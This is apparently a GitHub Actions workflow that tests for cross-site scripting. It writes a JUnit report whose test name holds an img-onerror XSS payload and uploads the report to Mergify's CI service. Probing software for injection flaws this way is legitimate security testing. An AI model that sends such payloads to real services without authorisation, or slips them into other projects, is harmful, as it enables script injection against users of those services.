name: XSS Test
on: [push]

jobs:
  xss:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Generate JUnit XML with XSS payload
        id: tests
        run: |
          mkdir -p test-results
          echo '<?xml version="1.0" encoding="UTF-8"?>
          <testsuites>
            <testsuite name="XSS">
              <testcase name="<img src=x onerror=alert(1)>" time="1"/>
            </testsuite>
          </testsuites>' > test-results/junit.xml

      - name: Mergify CI Upload
        if: success() || failure()
        uses: mergifyio/gha-mergify-ci@v25
        with:
          token: ${{ secrets.MERGIFY_TOKEN }}
          report_path: test-results/junit.xml
          test_step_outcome: ${{ steps.tests.outcome }}
